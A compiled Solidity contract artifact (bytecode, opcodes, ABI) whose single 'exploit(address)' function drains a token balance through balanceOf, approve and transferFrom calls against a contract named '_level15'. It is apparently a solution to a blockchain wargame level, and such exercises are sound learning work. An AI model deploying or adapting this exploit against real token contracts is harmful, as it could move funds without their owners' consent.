{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b5060405161055b38038061055b833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61044f8061010c5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80630aeb4ddf1461002d575b5f80fd5b6100476004803603810190610042919061029d565b610049565b005b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b81526004016100a391906102d7565b602060405180830381865afa1580156100be573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100e29190610323565b90505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b383836040518363ffffffff1660e01b815260040161013e92919061035d565b6020604051808303815f875af115801561015a573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061017e91906103b9565b505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd835f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846040518463ffffffff1660e01b81526004016101fa939291906103e4565b6020604051808303815f875af1158015610216573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061023a91906103b9565b505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61026c82610243565b9050919050565b61027c81610262565b8114610286575f80fd5b50565b5f8135905061029781610273565b92915050565b5f602082840312156102b2576102b161023f565b5b5f6102bf84828501610289565b91505092915050565b6102d181610262565b82525050565b5f6020820190506102ea5f8301846102c8565b92915050565b5f819050919050565b610302816102f0565b811461030c575f80fd5b50565b5f8151905061031d816102f9565b92915050565b5f602082840312156103385761033761023f565b5b5f6103458482850161030f565b91505092915050565b610357816102f0565b82525050565b5f6040820190506103705f8301856102c8565b61037d602083018461034e565b9392505050565b5f8115159050919050565b61039881610384565b81146103a2575f80fd5b50565b5f815190506103b38161038f565b92915050565b5f602082840312156103ce576103cd61023f565b5b5f6103db848285016103a5565b91505092915050565b5f6060820190506103f75f8301866102c8565b61040460208301856102c8565b610411604083018461034e565b94935050505056fea2646970667358221220489bbaa89849df9f22d956fcdf7ec949af4b61f52bb0f1ecfcb70fc816fb65a864736f6c634300081a0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x55B CODESIZE SUB DUP1 PUSH2 0x55B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x44F DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAEB4DDF EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x29D JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA3 SWAP2 SWAP1 PUSH2 0x2D7 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBE JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xE2 SWAP2 SWAP1 PUSH2 0x323 JUMP JUMPDEST SWAP1 POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 DUP4 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13E SWAP3 SWAP2 SWAP1 PUSH2 0x35D JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x17E SWAP2 SWAP1 PUSH2 0x3B9 JUMP JUMPDEST POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP4 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1FA SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x3E4 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x216 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x23A SWAP2 SWAP1 PUSH2 0x3B9 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x26C DUP3 PUSH2 0x243 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x27C DUP2 PUSH2 0x262 JUMP JUMPDEST DUP2 EQ PUSH2 0x286 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x297 DUP2 PUSH2 0x273 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2B2 JUMPI PUSH2 0x2B1 PUSH2 0x23F JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2BF DUP5 DUP3 DUP6 ADD PUSH2 0x289 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D1 DUP2 PUSH2 0x262 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2EA PUSH0 DUP4 ADD DUP5 PUSH2 0x2C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x302 DUP2 PUSH2 0x2F0 JUMP JUMPDEST DUP2 EQ PUSH2 0x30C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x31D DUP2 PUSH2 0x2F9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x338 JUMPI PUSH2 0x337 PUSH2 0x23F JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x345 DUP5 DUP3 DUP6 ADD PUSH2 0x30F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x357 DUP2 PUSH2 0x2F0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x370 PUSH0 DUP4 ADD DUP6 PUSH2 0x2C8 JUMP JUMPDEST PUSH2 0x37D PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x34E JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x398 DUP2 PUSH2 0x384 JUMP JUMPDEST DUP2 EQ PUSH2 0x3A2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x3B3 DUP2 PUSH2 0x38F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3CE JUMPI PUSH2 0x3CD PUSH2 0x23F JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x3DB DUP5 DUP3 DUP6 ADD PUSH2 0x3A5 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x3F7 PUSH0 DUP4 ADD DUP7 PUSH2 0x2C8 JUMP JUMPDEST PUSH2 0x404 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x2C8 JUMP JUMPDEST PUSH2 0x411 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x34E JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BASEFEE SWAP12 0xBA 0xA8 SWAP9 BLOBHASH 0xDF SWAP16 0x22 0xD9 JUMP 0xFC 0xDF PUSH31 0xC949AF4B61F52BB0F1ECFCB70FC816FB65A864736F6C634300081A00330000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "220600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"exploit(address)": "infinite"
			}
		},
		"methodIdentifiers": {
			"exploit(address)": "0aeb4ddf"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_level15",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "my_wallet",
					"type": "address"
				}
			],
			"name": "exploit",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}